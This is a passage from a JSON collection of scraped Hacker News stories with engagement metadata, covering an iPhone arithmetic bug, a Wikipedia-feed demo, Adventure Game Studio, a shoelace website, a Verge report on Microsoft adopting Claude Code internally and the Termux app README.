software problem â€“ my code, the library, the framework, my skills as a developer. The breakthrough was basically: \"What if I'm not dumb and it's not my code?\"\n\nAs for my phone: it'll probably go back to Apple, as a trade in for a new iPhone 17 Pro Max thathopefully ğŸ¤can do math.\n\nUpdate on Feb. 1st:\n\nWell, now it's Feb. 1st and I have an iPhone 17 Pro Max to test with and... everything works as expected. So it's pretty safe to say thatTHATspecific instance of iPhone 16 Pro Max was hardware-defective.",
      "url": "https://journal.rafaelcosta.me/my-thousand-dollar-iphone-cant-do-math/",
      "author_username": "rafaelcosta",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://journal.rafaelcosta.me/content/images/2026/01/original-39c7e1f432c4bda26535fd3e0b5cb7d5.webp",
          "alt": ""
        },
        {
          "type": "image",
          "url": "https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-28-at-01.14.46.png",
          "alt": ""
        },
        {
          "type": "image",
          "url": "https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-28-at-02.09.49.png",
          "alt": ""
        },
        {
          "type": "image",
          "url": "https://journal.rafaelcosta.me/content/images/2026/01/Screenshot-2026-01-27-at-18.28.38.png",
          "alt": ""
        }
      ],
      "impressions_views": null,
      "impressions_likes": 425,
      "impressions_reposts": 0,
      "impressions_replies": 204,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:54.478231",
      "published_at": "2026-02-01T15:51:56",
      "scraped_at": "2026-02-03T09:02:54.478278",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46849258",
        "kids_count": 34,
        "sections": [
          "best_stories"
        ]
      },
      "content_hash": "91de85ec962e546cebda311b3e3729ff"
    },
    {
      "id": "1d2d1277ac535175d4c38fec57af8487",
      "source": "hackernews",
      "source_id": "46850803",
      "title": "Show HN: Wikipedia as a doomscrollable social media feed",
      "content": "Loading...\n\nXikipedia\n\nbyrebane2001\n\nXikipediais a pseudo social media feed that algorithmically shows you content fromSimple Wikipedia. It is made as a demonstration of how even a basic non-ML algorithm with no data from other users can quickly learn what you engage with to suggest you more similar content. No data is collected or shared here, the algorithm runs locally and the data disappears once you refresh or close the tab.\n\nSource code onGitHub, discuss onfedi,bluesky, ortwitter.\n\nNote to iOS users: Apple arbitrarily limits the amount of memory a site can use, which means it's possible this site will crash before the loading finishes. I have no way to test for this myself as my iPhone does not do that. If this happens to you, try opening the site in desktop mode and see if that helps. If it still crashes, you'll just have to use this site from a different device. Blame Apple for creating undebuggable web platform issues while not letting you use an alternative browser engine on a device you supposedly own.\n\nPick some categories to get started (optional)\n\nOr add your own\n\nSince the content and images shown is from random Wikipedia articles, you will likely see NSFW content. Please only continue if you're an adult.",
      "url": "https://xikipedia.org",
      "author_username": "rebane2001",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 424,
      "impressions_reposts": 0,
      "impressions_replies": 137,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:54.860800",
      "published_at": "2026-02-01T19:12:19",
      "scraped_at": "2026-02-03T09:02:54.860832",
      "metadata": {
        "item_type": "show_hn",
        "hn_url": "https://news.ycombinator.com/item?id=46850803",
        "kids_count": 69,
        "sections": [
          "best_stories",
          "show_hn"
        ]
      },
      "content_hash": "ea95b1b0dcc2b1be894d6ae20e158896"
    },
    {
      "id": "465237f7d7490b562942183fe0035674",
      "source": "hackernews",
      "source_id": "46846252",
      "title": "Adventure Game Studio: OSS software for creating adventure games",
      "content": "Create\n\nyour own adventure games\n\nPlay\n\nthousands of games\n\nJoin\n\nour supportive community\n\nAdventure Game Studio (AGS) is open-source software for creating graphical point-and-click\r\n                        adventure games. It is free, standalone, and requires no subscription.\n\nThe Windows-based IDE, streamlines game creation by integrating tools for\r\n                        importing graphics, writing scripts, and testing. Games created with AGS can be played on\r\n                        multiple platforms, including Linux, iOS, and Android.\n\nSuitable for all skill levels, AGS features an active community for support and\r\n                        socialising.\n\nShowcase your games by uploading them to this website.\n\n3.6.2 - Patch 6 (.exe)\n\n3.6.2 - Patch 6 (.zip)\n\nRot your brain by consuming AI slop and services in this classic arcade style game created for the MAGS January 2026 game jam in the AGS forums.Move[â€¦]\n\nYou awaken alone on a cold, rocky shore beneath a moonless sky, dragged from the sea through a sewer pipe with no memory of who you are, how you[â€¦]\n\nThe black horse of war looms over the land, with the ominous Lord Ironcrow at the reins. Because Pib's apprenticeship makes him vulnerable to the[â€¦]\n\nGet in, get the loot, get out... that's how it usually goes for master cat burglar Trilby. But after he breaks into the supposedly vacated country[â€¦]\n\nRot your brain by consuming AI slop and services in this classic arcade style game created for the MAGS January 2026 game jam in the AGS forums.Move[â€¦]\n\nYou awaken alone on a cold, rocky shore beneath a moonless sky, dragged from the sea through a sewer pipe with no memory of who you are, how you[â€¦]\n\nThe black horse of war looms over the land, with the ominous Lord Ironcrow at the reins. Because Pib's apprenticeship makes him vulnerable to the[â€¦]\n\nGet in, get the loot, get out... that's how it usually goes for master cat burglar Trilby. But after he breaks into the supposedly vacated country[â€¦]\n\nThe latest from our forums\n\nIn: Competitions & ActivitiesBy: brushfe(56Â minutesÂ ago)\n\nIn: AGS Engine & Editor ReleasesBy: Crimson Wizard(1Â hourÂ ago)\n\nIn: Adventure Related Talk & ChatBy: heltenjon(4Â hoursÂ ago)\n\nIn: The Rumpus RoomBy: Rui \"Giger Kitty\" Pires(5Â hoursÂ ago)\n\nIn: Completed Game AnnouncementsBy: heltenjon(5Â hoursÂ ago)\n\nIn: The Rumpus RoomBy: Rui \"Giger Kitty\" Pires(5Â hoursÂ ago)\n\nIn: AGS Engine & Editor ReleasesBy: Crimson Wizard(10Â hoursÂ ago)\n\nIn: Competitions & ActivitiesBy: Baron(10Â hoursÂ ago)\n\nOther community channels\n\nAGS has an active and friendly community, with many ways of keeping in touch and\r\n                                getting help with your project or games made with AGS.\n\nThese include our local forums, Facebook page, Discord server, in-person meet-ups,\r\n                                and many more.\n\nDonate to the AGS Community\n\nThe AGS community is run by a team of dedicated volunteers, who put their time and\r\n                                efforts into keeping it running as a welcoming, friendly and informative place to be.\r\n                                The AGS server and forums are paid for out of our own pockets, so in effect it costs\r\n                                us money to provide a free service to AGS users.\n\nIf you appreciate the work we do, and would like to give a little something back,\r\n                                please use the below link to donate via PayPal. Any profit made after covering server\r\n                                costs will be put back into hosting community events such asMittens.",
      "url": "https://www.adventuregamestudio.co.uk/",
      "author_username": "doener",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 396,
      "impressions_reposts": 0,
      "impressions_replies": 86,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:55.368687",
      "published_at": "2026-02-01T08:56:56",
      "scraped_at": "2026-02-03T09:02:55.368698",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46846252",
        "kids_count": 30,
        "sections": [
          "best_stories"
        ]
      },
      "content_hash": "9ec7ca3f19a5281bcb2bdcda6f68a434"
    },
    {
      "id": "5d56db8c8319ce0e3f987d465b4bbbed",
      "source": "hackernews",
      "source_id": "46848231",
      "title": "Ian's Shoelace Site",
      "content": "LacingLACINGShoe Lacing MethodsBi-Color MethodsLug Lacing MethodsU-Lace MethodsCreate-a-Lace2 Trillion Methods?Lacing ComparisonLacing RatingsLacing Photos\n\nLACING\n\nShoe Lacing Methods\n\nBi-Color Methods\n\nLug Lacing Methods\n\nU-Lace Methods\n\nCreate-a-Lace\n\n2 Trillion Methods?\n\nLacing Comparison\n\nLacing Ratings\n\nLacing Photos\n\nTyingTYINGShoelace KnotsThe â€œGranny Knotâ€Knot VariationsUntying ShoesKnot ComparisonKnot Ratings\n\nTYING\n\nShoelace Knots\n\nThe â€œGranny Knotâ€\n\nKnot Variations\n\nUntying Shoes\n\nKnot Comparison\n\nKnot Ratings\n\nLearnLEARNShoelace ConstructionShoelace LengthsShoelace Tips (â€œAgletsâ€)Interviews & ArticlesTips & HintsQuestions & AnswersAs Seen In...Shoelace Links\n\nLEARN\n\nShoelace Construction\n\nShoelace Lengths\n\nShoelace Tips (â€œAgletsâ€)\n\nInterviews & Articles\n\nTips & Hints\n\nQuestions & Answers\n\nAs Seen In...\n\nShoelace Links\n\nAboutABOUTAbout This SitePrivacy PolicySite MapThis Site's SponsorsSupport This SiteLinking To This SiteAbout IanContact Ian\n\nABOUT\n\nAbout This Site\n\nPrivacy Policy\n\nSite Map\n\nThis Site's Sponsors\n\nSupport This Site\n\nLinking To This Site\n\nAbout Ian\n\nContact Ian\n\nConnectCONNECTContact Ian (e-mail)YouTube (videos)Instagram (photos)Twitter (updates)Facebook (updates)RSS Feed (updates)\n\nCONNECT\n\nContact Ian (e-mail)\n\nYouTube (videos)\n\nInstagram (photos)\n\nTwitter (updates)\n\nFacebook (updates)\n\nRSS Feed (updates)\n\nSearchSEARCH\n\nSEARCH\n\nfieggen.com\n\nIan's Shoelace Site\n\nIan'sÂ ShoelaceÂ Site\n\nFun, fashion & science in the Internet's #1 website about shoelaces â€“ and home of theIanÂ Knot, the world's fastest shoelace knot. If you want to lace shoes, tie shoes or learn about shoelaces â€“ this is the place!\n\nWelcome!\n\nG'day everyone, Ian Fieggen here, also known asâ€œProfessor Shoelaceâ€. I'm areal humanliving in Melbourne, Australia. This website has no â€œA.I.â€ content â€“ it's all built with â€œH.I.â€ plus Human Effort over more thantwo decades.\n\nWelcome toâ€œIan's Shoelace Siteâ€â€“ madebyone human,forall humans.\n\nTable of Contents\n\nContains over 100Â Ã— step-by-step shoe lacing tutorials, over 2,700Â Ã— shoe lacing photos, plus the interactiveâ€œCreate-a-Laceâ€for designing your own lacing.\n\nContains 25Â Ã— shoelace knots (including my world's fastestâ€œIanÂ Knotâ€), plus info on tying correctly so that they sit straight and stay securely tied\n\tâ€“ yet can be untied without jamming.\n\nHeaps of knowledge about shoelaces, including their construction, length calculations â€“ even what the tips are called, as well as Ian's interviews,\n\tarticles, Q&As and more.\n\nInformation about this website and the site's author, Ian Fieggen â€“ including Ian's contact details.\n\tAlso info on this site's sponsors plus ways thatyou, too, can support Ian.\n\nContact Ian Fieggen via e-mail or connect withâ€œProfessor Shoelaceâ€via YouTube, Instagram, Twitter, Facebook or RSS feed.\n\nLooking for something? This website has more than300 pagesâ€“ which can be daunting to wade through!\n\tSearch the whole ofIan's Shoelace Siteusing Google Custom Search.\n\nLatest Photo\n\n03-Feb-2026\n\nToday's shoe lacing photo was contributed by GuillaumeÂ R. in Feb-2026.\n\nBlack & grey Nike Free Run 2s with orange & white trim laced with patterned black & whiteCheckerboard Lacing.\n\nAnextremelysparse Checkerboard after attempting to use a single shoelace that wasn't particularly long.\n\nMore Shoe Lacing Photos\n\nWhat's New?\n\n22-Jan-2025â€“ Added Ian'sinterview from 2018about modern shoelace alternatives, plus aninterview from 2020about lacing, knots and myâ€œProfessor Shoelaceâ€alias.\n\n04-Dec-2025â€“ During Australia's marriage equality debate, PUMA engaged me to create the â€œEquality Knotâ€, then sent a film crew to shoot this â€œcontent pieceâ€ video.\n\n02-Dec-2025â€“ Following a visitor request, I added diagrams for the inverted variation of Pentagram Lacing for 7, 6 and 5Â pairs of eyelets.\n\n28-Nov-2025â€“ Following a suggestion from a website visitor, I added buttons to filter by either â€œShorteningâ€ or â€œLengtheningâ€ methods.\n\n10-Nov-2025â€“ Added Ian's interview from Dec-2016 withThe Stuph Fileabout my Shoelace Site, from its humble beginnings through to the extensive and respected website that it is today.\n\n06-Nov-2025â€“ Added Ian's interview from Sep-2015 withBBC Radio 4, which coincided with â€œback to schoolâ€ in the UK, covered teaching kids to tie their shoes for the first time.\n\n29-Oct-2025â€“ This website has long included â€œWoven Lacingâ€ for shoes witheyelets. A recent visitor-contributed photo prompted me to addLug Woven Lacingfor shoes withlugs.\n\n14-Oct-2025â€“ Added an interactiveShoelace Weave Diagram, which allows you to experiment with creating shoelace weave patterns thread-by-thread.\n\nRecent Visitor Feedback\n\nHi Ian! Many thanks for maintaining your great website for everyone to enjoy :) I just ordered your book from a used-book shop, and I figured I should send some of that money your way as well.\n\nâ€“ Philip Ã…., Sweden, Feb-2026\n\nIndeed, Philip's message was accompanied by a donation. What a lovely gesture â€“ thank you!\n\nâ€“ Ian Fieggen\n\nThank you for all you do to spread knowledge!\n\nâ€“ Malcolm S., USA, Feb-2026\n\nMalcolm's feedback included a nice donation â€“ thanks!\n\nâ€“ Ian Fieggen\n\nI got your book, Pimp your Kicks decades ago. Every time I get a new pair of laced shoes, out it comes.\n\tNow I'm weaving shoelaces, and your site kept coming up, with the best reference on aiglets, a tool for calculating shoelace length. Thanks a million!\n\nâ€“ Larissa D., Australia, Feb-2026\n\nI'm pleased to have had such a positive effect on Larissa's life, and was humbled to then also receive a generous donation â€“ thank you!\n\nâ€“ Ian Fieggen\n\nI just want to express my gratitude and appreciation for your website and the work you put into it.\n\tI look forward to learning all about tying knots I'm going to relish for years to come. Thank you again, sir.\n\nâ€“ Travis S., Virginia, USA, Feb-2026\n\nCan't believe that I've been tying my shoelaces wrongly for 50 years! Never too late to learn I guess... many thanks\n\nâ€“ Mike B., UK, Feb-2026\n\nA lesson that will at least benefit Mike for thenext50-odd years â€“ and which prompted a donation in gratitude. Thanks, Mike!\n\nâ€“ Ian Fieggen\n\nTonight I was having a grand time looking through your shoe lacing tutorials for fun,\n\tand then I saw that youactually inventedmy favorite way to tie my shoes and show off a little bit!\n\nI yelled â€œHE INVENTED THIS KNOT? I KNOW THAT KNOT!!!â€ (and scared my cat a little bit hahahaha)\n\nAnyways just wanted to thank you for having a great website, Iâ€™m really enjoying it and canâ€™t wait to try out some of the decorative lacing on my boots!\n\nâ€“ Selkie, Los Angeles, USA, Feb-2026\n\nWhen the Canadian Forces' lacing instructions were at best a 2/10 I got referenced to this site and never looked back, thank you.\n\nâ€“ Andres S., Canada, Jan-2026\n\nAndres was also appreciative enough to send a donation â€“ thanks!\n\nâ€“ Ian Fieggen\n\nIf you'd also like to send feedback, pleaseContactÂ Ian.\n\nâ€œMust Seeâ€ Links\n\nTie your shoes in a split second with myâ€œIanÂ Knotâ€, the World's Fastest Shoelace Knot.\n\nCheck you'renottying aâ€œGranny Knotâ€, which sits crooked and comes loose.\n\nSupport Ian\n\nSponsors\n\nPrev. Page\n\nTop\n\nNext Page\n\nThis page last updated: 03-Feb-2026. CopyrightÂ Â©Â 2003-2026 by IanÂ W.Â Fieggen. AllÂ rightsÂ reserved.\n\nWebsite created byIanÂ Fieggen(aka.â€œProfessorÂ Shoelaceâ€), inventorÂ ofÂ theIanÂ Knot.\n\nIan's Other Websites:SoftwareGraphicsIanChrisTree",
      "url": "https://www.fieggen.com/shoelace/",
      "author_username": "righthand",
      "author_category": "unknown",
      "media": [],
      "impressions_views": null,
      "impressions_likes": 391,
      "impressions_reposts": 0,
      "impressions_replies": 73,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:55.840990",
      "published_at": "2026-02-01T13:38:04",
      "scraped_at": "2026-02-03T09:02:55.841001",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46848231",
        "kids_count": 32,
        "sections": [
          "best_stories"
        ]
      },
      "content_hash": "e30dcf181eb0d54b369582163f63f278"
    },
    {
      "id": "7be50c1abd0a1e7770b43c4ee9c4e3a7",
      "source": "hackernews",
      "source_id": "46854999",
      "title": "Claude Code is suddenly everywhere inside Microsoft",
      "content": "Tech\n\nAI\n\nMicrosoft\n\nClaude Code is suddenly everywhere inside Microsoft\n\nMicrosoft sells GitHub Copilot to its customers, but it increasingly favors Claude Code internally.\n\nMicrosoft sells GitHub Copilot to its customers, but it increasingly favors Claude Code internally.\n\nLink\n\nShare\n\nGift\n\nDevelopers have been comparing the strengths and weaknesses of Anthropicâ€™s Claude Code, Anysphereâ€™s Cursor, and Microsoftâ€™s GitHub Copilot for months now, looking for a winner. While no individual AI coding tool manages to be the best at every task that software developers do each day, Claude Code is increasingly coming out on top for its ease of use, both for developers and nontechnical users.\n\nIt seems like Microsoft agrees, as sources tell me the company is now encouraging thousands of its employees from some of its most prolific teams to pick up Claude Code and get coding, even if theyâ€™re not developers.\n\nMicrosoft first started adopting Anthropicâ€™s Claude Sonnet 4 model inside its developer division in June last year, beforefavoring it for paid usersof GitHub Copilot several months later. Now, Microsoft is going a step beyond using Anthropicâ€™s AI models and widely adopting Claude Code across its biggest engineering teams.\n\nMicrosoftâ€™s CoreAI team, the new AI engineering group led by former Meta engineering chief Jay Parikh, has been testing Claude Code in recent months, and last week Microsoftâ€™s Experiences + Devices division were being asked to install Claude Code. This division is responsible for Windows, Microsoft 365, Outlook, Microsoft Teams, Surface, and more.\n\nEven employees without any coding experience are being encouraged to experiment with Claude Code, to allow designers and project managers to prototype ideas. Microsoft has also approved the use of Claude Code across all of its code and repositories for its Business and Industry Copilot teams.\n\nSoftware engineers at Microsoft are now expected to use both Claude Code and GitHub Copilot and give feedback comparing the two, Iâ€™m told. Microsoft sells GitHub Copilot as its AI coding tool of choice to its customers, but if these broad internal pilot programs are successful, then itâ€™s possible the company could even eventually sell Claude Code directly to its cloud customers.\n\nMicrosoft is now one of Anthropicâ€™s top customers, according to a recent report fromThe Information. The software maker is also counting selling Anthropic AI models toward Azure sales quotas, which is unusual given Microsoft typically only offers its salespeople incentives for homegrown products or models from OpenAI.\n\nMicrosoftâ€™s decision to adopt Claude Code more broadly among its engineering teams certainly looks like a vote of confidence in Anthropicâ€™s AI tools over its own, especially as itâ€™s encouraging nontechnical employees to try out coding. But the reality is that Microsoftâ€™s developers are likely to use a mix of AI tools, and adopting Claude Code is another part of that tool set.\n\nâ€œCompanies regularly test and trial competing products to gain a better understanding of the market landscape,â€ says Frank Shaw, Microsoftâ€™s communications chief, in a statement toNotepad. â€œOpenAI continues to be our primary partner and model provider on frontier models, and we remain committed to our long-term partnership.â€\n\nWhile Microsoft remains committed to OpenAI, it is increasingly working with Anthropic to bring its models and tools to Microsoftâ€™s own teams and the software it sells to customers. Microsoft and Anthropicsigned a dealin November that allows Microsoft Foundry customers to get access to Claude Sonnet 4.5, Claude Opus 4.1, and Claude Haiku 4.5. The deal also involves Anthropic committing to purchasing $30 billion of Azure compute capacity.\n\nMicrosoft has also started favoring Anthropicâ€™s Claude modelsinside Microsoft 365 apps and Copilotrecently, using them inspecific appsor features where Anthropicâ€™s models have proved more capable than OpenAIâ€™s counterparts.\n\nThe big question here is, what does the increased use of Claude Code at Microsoft mean for its more than 100,000 code repositories? Microsoft told me last year that91 percent of its engineering teams use GitHub Copilotand a variety of teams have been using the AI tool to speed up mundane tasks. Microsoftâ€™s use of AI tools has been largely restricted to software engineers, but with Claude Code andClaude Cowork, Anthropic is increasingly focused on making coding and non-coding tasks more approachable, thanks to AI agent capabilities.\n\nMicrosoft is embracing the ease of use of Claude Code to allow more nontechnical employees to commit code using AI, and this broad pilot will certainly highlight the challenges and benefits of that shift. It also puts further pressure on junior developer roles, with fears in the industry that these roles are increasingly disappearing because of AI. Microsoft just took another big step toward a future where more autonomous AI agents are creating code, further wrestling control from its software engineers.\n\nItâ€™s Xbox time\n\nMicrosoft is getting ready to show off two of its biggest Xbox games this year,Forza Horizon 6andFable, later today as part of itsXbox Developer Direct stream. There will also be a first in-depth look atBeast of Reincarnationand at least one other game shown, Iâ€™m hearing. Double Fine is ready toshow offKiln, a multiplayer, team-based brawler. I understand Double Fine has been holding playtests recently, where you play as a spirit that can inhabit pottery and carry water to douse an opponentâ€™s kiln and put out a fire.\n\nI wouldnâ€™t be surprised to seeKilnappear as an early preview in the coming months, followed byForza Horizon 6in May and thenHalo: Campaign Evolved.I keep hearing that bothFableandGears of War: E-Dayare currently targeting a release in the second half of this year. Microsoft is keen to release newForza,Gears,Halo, andFablegames in 2026 to mark 25 years of Xbox.\n\nThe pad\n\nMicrosoftâ€™s first Windows 11 update of 2026 stopped some computers from shutting down.Itâ€™s only January and Microsoft has had to rush out an emergency out-of-band fix that stopped some Windows 11 PCs from shutting down.The issueswere limited to machines running Enterprise and IoT editions of Windows 11 version 23H2, but itâ€™s yet another buggy update for Windows, which is becoming increasingly common.\n\nMicrosoftâ€™s free Xbox Cloud Gaming is coming soon with ads.Microsoft is getting closer to launching its free streaming option for Xbox Cloud Gaming. The ad-supported featurehas started appearinginside the Xbox app for PC, indicating â€œ1 hour of ad-supported playtime per session.â€ Iâ€™m expecting to see this rollout with preroll ads in the coming weeks, but there could be limits of up to five hours free per month.\n\nMicrosoft wants to build 15 data centers in Mount Pleasant, Wisconsin.The empty land formerly owned by Foxconn is about to be transformedinto Microsoft data centers. Leaders of the local village in Mount Pleasant, Wisconsin, approved plans for the data centers earlier this week, and final approval could come next week. Foxconnâ€™s failed Wisconsin project had promised 13,000 jobs, but now the land will be filled with a 1.2-million-square-foot data center project that will hold hundreds of thousands of Nvidiaâ€™s AI GPUs.\n\nThe Xbox app is now available for all Arm-based Windows 11 PCs.After a rocky start to gaming on Windows on Arm, Microsoft hasupdated its Xbox appthis week so itâ€™s fully compatible with all Qualcomm-powered devices. More than 85 percent of the Xbox Game Pass catalog is also now compatible with Arm-based devices, but the majority of games will still need to be emulated using Microsoftâ€™s Prism technology.\n\nMicrosoft Paint now has an AI-powered coloring book.Microsoft is adding more AI features to its Paint app this week. Windows testers can now try out acoloring book featurethat lets you create coloring book pages from a text prompt. Itâ€™s available inside the Copilot button in Paint, and you have to have a Copilot Plus PC to be able to use it. Notepad (the app!) is also getting expanded Markdown syntax features and a new welcome experience to highlight features. I never thought Iâ€™d see the day that Notepad, a lightweight app, would need a welcome screen because of all the features Microsoft has packed in.\n\nGitHub has a new Copilot SDK.Microsoft is announcing a technical preview of itsGitHub Copilot SDKtoday, which brings the power of the GitHub Copilot CLI to any app. It essentially allows developers to bring GitHub Copilot capabilities as a programmable SDK for Python, TypeScript, Go, and .NET. Microsoft teams have already used this to build custom GUIs for agents, summarizing tools, YouTube chapter generators, and more.\n\nSatya Nadella and former British Prime Minister Rishi Sunak chat AI.Former UK leaderRishi Sunaktook on a senior adviser role at Microsoft and Anthropic last year, and heâ€™s now appeared alongside Microsoft CEOSatya Nadellato discuss the future of AI. The roughly30-minute talkdidnâ€™t have any surprising news, but Sunak did agree with Nvidia CEOJensen Huangthat â€œyou may not lose your job to AI, but you may well lose your job to someone using AI.â€ Nadella thinks AI will make us all â€œmanagers of infinite minds,â€ much like how we have â€œinformation at your fingertips.â€\n\nMicrosoft now sponsors the Mercedes-AMG F1 team. Microsoft is switching its F1 allegiances from Alpine to Mercedes-AMG for the 2026 season. Anew multiyear partnershipwill see Mercedes-AMG use Microsoft technologies for race team operations and plaster the Microsoft logo in prominent positions on the 2026 Mercedes-AMG F1 car and on racing suits. Thereâ€™s a big technical shake-up for the 2026 season, with all-new chassis, power units, and fuel regulations.\n\nIâ€™m always keen to hear from readers, so please drop a comment here, or you can reach me atnotepad@theverge.comif you want to discuss anything else. If youâ€™ve heard about any of Microsoftâ€™s secret projects, you can reach me via email atnotepad@theverge.comor",
      "url": "https://www.theverge.com/tech/865689/microsoft-claude-code-anthropic-partnership-notepad",
      "author_username": "Anon84",
      "author_category": "unknown",
      "media": [
        {
          "type": "image",
          "url": "https://www.google-analytics.com/g/collect?v=2&tid=G-C3QZPB4GVE&cid=555&en=noscript_page_view",
          "alt": ""
        }
      ],
      "impressions_views": null,
      "impressions_likes": 376,
      "impressions_reposts": 0,
      "impressions_replies": 503,
      "impressions_bookmarks": null,
      "impressions_clicks": null,
      "impressions_quotes": null,
      "impressions_updated_at": "2026-02-03T09:02:55.955826",
      "published_at": "2026-02-02T06:58:58",
      "scraped_at": "2026-02-03T09:02:55.955839",
      "metadata": {
        "item_type": "story",
        "hn_url": "https://news.ycombinator.com/item?id=46854999",
        "kids_count": 44,
        "sections": [
          "best_stories"
        ]
      },
      "content_hash": "7a98996d44d59cebaa4bd42fcaa024aa"
    },
    {
      "id": "e86e67a49aa849351cfcbec19efcbeeb",
      "source": "hackernews",
      "source_id": "46854642",
      "title": "Termux",
      "content": "Termux application\n\nTermuxis an Android terminal application and Linux environment.\n\nNote that this repository is for the app itself (the user interface and the terminal emulation). For the packages installable inside the app, seetermux/termux-packages.\n\nQuick how-to about Termux package management is available atPackage Management. It also has info on how to fixrepository is under maintenance or downerrors when runningaptorpkgcommands.\n\nWe are looking for Termux Android application maintainers.\n\nNOTICE: Termux may be unstable on Android 12+.Android OS will kill any (phantom) processes greater than 32 (limit is for all apps combined) and also kill any processes using excessive CPU. You may get[Process completed (signal 9) - press Enter]message in the terminal without actually exiting the shell process yourself. Check the related issue#2366,issue tracker,phantom cached and empty processes docsandthis TLDR commenton how to disable trimming of phantom and excessive cpu usage processes. A proper docs page will be added later. An option to disable the killing should be available in Android 12L or 13, so upgrade at your own risk if you are on Android 11, specially if you are not rooted.\n\nContents\n\nTermux App and Plugins\n\nInstallation\n\nUninstallation\n\nImportant Links\n\nDebugging\n\nFor Maintainers and Contributors\n\nForking\n\nSponsors and Funders\n\nTermux App and Plugins\n\nThe coreTermuxapp comes with the following optional plugin apps.\n\nTermux:API\n\nTermux:Boot\n\nTermux:Float\n\nTermux:Styling\n\nTermux:Tasker\n\nTermux:Widget\n\nInstallation\n\nLatest version isv0.118.3.\n\nNOTICE: It is highly recommended that you update tov0.118.0or higher ASAP for various bug fixes, including a critical world-readable vulnerability reportedhere. Seebelowfor information regarding Termux on Google Play.\n\nTermux can be obtained through various sources listed below foronlyAndroid>= 7with full support for apps and packages.\n\nSupport for both app and packages was dropped for Android5and6on2020-01-01atv0.83, however it was re-added just for the appwithout any support for package updateson2022-05-24via theGitHubsources. Checkherefor the details.\n\nThe APK files of different sources are signed with different signature keys. TheTermuxapp and all its plugins use the samesharedUserIdcom.termuxand so all their APKs installed on a device must have been signed with the same signature key to work together and so they must all be installed from the same source. Do not attempt to mix them together, i.e do not try to install an app or plugin fromF-Droidand another one from a different source likeGitHub. Android Package Manager will also normally not allow installation of APKs with different signatures and you will get errors on installation likeApp not installed,Failed to install due to an unknown error,INSTALL_FAILED_UPDATE_INCOMPATIBLE,INSTALL_FAILED_SHARED_USER_INCOMPATIBLE,signatures do not match previously installed version, etc. This restriction can be bypassed with root or with custom roms.\n\nIf you wish to install from a different source, then you mustuninstall any and all existing Termux or its plugin app APKsfrom your device first, then install all new APKs from the same new source. CheckUninstallationsection for details. You may also want to considerBacking up Termuxbefore the uninstallation so that you can restore it after re-installing from Termux different source.\n\nIn the following paragraphs,\"bootstrap\"refers to the minimal packages that are shipped with thetermux-appitself to start a working shell environment. Its zips are built and releasedhere.\n\nF-Droid\n\nTermux application can be obtained fromF-Droidfromhere.\n\nYoudo notneed to download theF-Droidapp (via theDownload F-Droidlink) to install Termux. You can download the Termux APK directly from the site by clicking theDownload APKlink at the bottom of each version section.\n\nIt usually takes a few days (or even a week or more) for updates to be available onF-Droidonce an update has been released onGitHub. TheF-Droidreleases are built and published byF-Droidonce theydetecta newGitHubrelease. The Termux maintainersdo nothave any control over the building and publishing of the Termux apps onF-Droid. Moreover, the Termux maintainers also do not have access to the APK signing keys ofF-Droidreleases, so we cannot release an APK ourselves onGitHubthat would be compatible withF-Droidreleases.\n\nTheF-Droidapp often may not notify you of updates and you will manually have to do a pull down swipe action in theUpdatestab of the app for it to check updates. Make sure battery optimizations are disabled for the app, checkhttps://dontkillmyapp.com/for details on how to do that.\n\nOnly a universal APK is released, which will work on all supported architectures. The APK and bootstrap installation size will be~180MB.F-Droiddoesnot supportarchitecture specific APKs.\n\nGitHub\n\nTermux application can be obtained onGitHubeither fromGitHub Releasesfor version>= 0.118.0or fromGitHub Build Actionworkflows.For android>= 7, only installapt-android-7variants. For android5and6, only installapt-android-5variants.\n\nThe APKs forGitHub Releaseswill be listed underAssetsdrop-down of a release. These are automatically attached when a new version is released.\n\nThe APKs forGitHub Buildaction workflows will be listed underArtifactssection of a workflow run. These are created for each commit/push done to the repository and can be used by users who don't want to wait for releases and want to try out the latest features immediately or want to test their pull requests. Note that for action workflows, you need to belogged into aGitHubaccountfor theArtifactslinks to be enabled/clickable. If you are using theGitHubapp, then make sure to open workflow link in a browser like Chrome or Firefox that has your GitHub account logged in since the in-app browser may not be logged in.\n\nThe APKs for both of these aredebuggableand are compatible with each other but they are not compatible with other sources.\n\nBoth universal and architecture specific APKs are released. The APK and bootstrap installation size will be~180MBif using universal and~120MBif using architecture specific. Checkherefor details.\n\nSecurity warning: APK files on GitHub are signed with a test key that has beenshared with community. This IS NOT an official developer key and everyone can use it to generate releases for own testing. Be very careful when using Termux GitHub builds obtained elsewhere excepthttps://github.com/termux/termux-app. Everyone is able to use it to forge a malicious Termux update installable over the GitHub build. Think twice about installing Termux builds distributed via Telegram or other social media. If your device get caught by malware, we will not be able to help you.\n\nThetest keyshall not be used to impersonate @termux and can't be used for this anyway. This key is not trusted by us and it is quite easy to detect its use in user generated content.\n\nGoogle Play Store(Experimental branch)\n\nThere is currently a build of Termux available on Google Play for Android 11+ devices, with extensive adjustments in order to pass policy requirements there. This is under development and has missing functionality and bugs (seeherefor status updates) compared to the stable F-Droid build, which is why most users who can should still use F-Droid or GitHub build as mentioned above.\n\nCurrently, Google Play will try to update installations away from F-Droid ones. Updating will still fail assharedUserIdhas been removed. A planned 0.118.1 F-Droid release will fix this by setting a higher version code than used for the PlayStore app. Meanwhile, to prevent Google Play from attempting to download and then fail to install the Google Play releases over existing installations, you can open the Termux apps pages on Google Play and then click on the 3 dots options button in the top right and then disable the Enable auto update toggle. However, the Termux apps updates will still show in the PlayStore app updates 